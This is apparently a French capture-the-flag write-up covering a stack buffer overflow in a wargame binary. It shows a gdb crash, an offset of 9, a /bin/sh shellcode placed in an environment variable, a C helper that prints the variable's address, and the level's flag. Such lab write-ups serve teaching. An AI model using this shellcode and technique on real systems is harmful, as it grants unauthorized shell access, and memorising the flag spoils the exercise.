1. Pendant les premiers tests on remarque déjà que le programme segfault.
2. On ouvre gdb pour en savoir plus.
3. On remarque que le '\0' de dest est remplacé par 32 juste avant le `strcat`.
4. On écrit donc un exploit utilisant cette vulnérabilité.
5. La seconde entrée est responsable de l'overflow.
   ```
   (gdb) r
    -
   AAAAAAAAAAAAAAAAAAAA
    -
   BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

   Program received signal SIGSEGV, Segmentation fault.
   0x42424242 in ?? ()
   ```
6. L'offset est de 9.
7. On se rend compte qu'il n'y a pas la place pour mettre directement le shellcode, on utilise donc une variable d'environnement.
   ```
   export SHELLCODE="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
   ```
8. On écrit un petit programme pour connaître l'adresse de la variable.
   ```
   #include <stdio.h>
   #include <stdlib.h>

   int main ()
   {
	printf("%p\n", getenv("SHELLCODE"));
	return 0;
   }
   ```
9. Il suffit maintenant de jmp sur cette adresse pour ouvrir notre shell.

> Flag: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9